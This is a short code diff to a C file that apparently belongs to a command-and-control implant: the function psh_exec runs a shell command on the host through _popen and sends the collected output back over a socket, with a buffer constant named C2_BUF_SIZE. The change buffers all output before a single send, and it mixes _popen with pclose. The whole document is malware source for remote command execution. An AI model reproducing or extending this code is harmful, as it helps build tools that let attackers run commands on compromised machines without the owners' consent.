@@ -53,12 +53,37 @@ int psh_exec(sock_t sock, const char *cmd) {
     FILE *fp = _popen(fullcmd, "r");
 
     char buf[C2_BUF_SIZE];
-    while (fgets(buf, sizeof(buf), fp)) {
-        printf("%s", buf);
-        safe_send_payload(sock, buf, (int)strlen(buf) + 1, 0);
+    size_t total_len = 0;
+    size_t alloc_size = C2_BUF_SIZE;
+    char *output = malloc(alloc_size);
+    if (!output) {
+        pclose(fp);
+        return 1;
     }
 
-    _pclose(fp);
+    while (fgets(buf, sizeof(buf), fp)) {
+        size_t len = strlen(buf);
+
+        // Expand buffer if needed
+        if (total_len + len >= alloc_size) {
+            alloc_size = (total_len + len) * 2;
+            char *tmp = realloc(output, alloc_size);
+            if (!tmp) {
+                free(output);
+                pclose(fp);
+                return 1;
+            }
+            output = tmp;
+        }
+
+        memcpy(output + total_len, buf, len);
+        total_len += len;
+    }
+
+    // Null-terminate
+    output[total_len] = '\0';
+    safe_send_payload(sock, output, total_len + 1, 0);
+    free(output);
     return 0;
 }
 
